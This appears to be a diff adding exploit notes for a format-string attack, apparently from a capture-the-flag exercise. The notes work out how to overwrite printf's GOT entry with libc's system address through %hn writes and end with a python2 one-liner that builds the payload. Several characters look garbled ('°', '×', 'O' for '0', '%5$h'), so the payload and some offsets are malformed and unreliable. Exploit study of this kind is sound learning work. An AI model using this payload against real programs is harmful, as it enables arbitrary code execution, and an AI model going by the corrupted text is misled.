@@ -1,0 +1,35 @@
+
+
+
+
+# Need to overwrite 0x0804c00c (QT.printf) with Oxf7dff040 (LIBC .system)
+
+# It means writing 0xf7df (63455) @ 0x0804c00c + 2 = 0x0804c00e (high order)
+# and 0xf040 (61504) @ 0x0804c00c (low order)
+
+# Now, we have to figure out the value to set for the padding. Here is the formula
+[The value we want] - [The bytes alredy wrote] = [The value to set].
+# Let's start with the low order bytes :
+It'll will be 61504 - 8 = 61496, because we already wrote 8 bytes (the two 4 bytes addresses).
+
+ # Then, the high order bytes :
+ It'll will be 63455 - 61504 = 1951, because we already wrote 61504 bytes (the two 4 bytes addresses and 61496 bytes from
+the previous writing).
+
+ # Now we can construct the exploit (note our write offset is %4 so we want [°4,85] as offsets instead of [°7,%8]) :
+ It'll be : \xOc\xcO\X04\x08\x0e\xc0\×04\X08°61496×%4$hn°1951x85$hn. Let me explain :
+\x0c\ xc0\X04\x08 or 0x0804c00c (in reverse order) points to the low order bytes.
+low order bytes.
+
+\x0e\xc0\x04\x08 or 0x0804c00e (in reverse order) points to the high order bytes.
+
+%61496× will write 61496 bytes on the standard output.
+
+
+%4$hn will write 8 + 61496 = 61504 bytes (or Oxf040) at the first address specified (0x0804c00c).
+%1951x will write 1951 bytes on the standard output.
+
+%5$h will write 8 + 61496 + 1951 = 63455 (or oxf7df) at the second address specified (0×0804c00e).
+
+
+python2 -c 'print("\xOc\xcO\×04\x08\x0e\xc0\×04\X08°61496X84$hn°1951X85$hn")'> payload
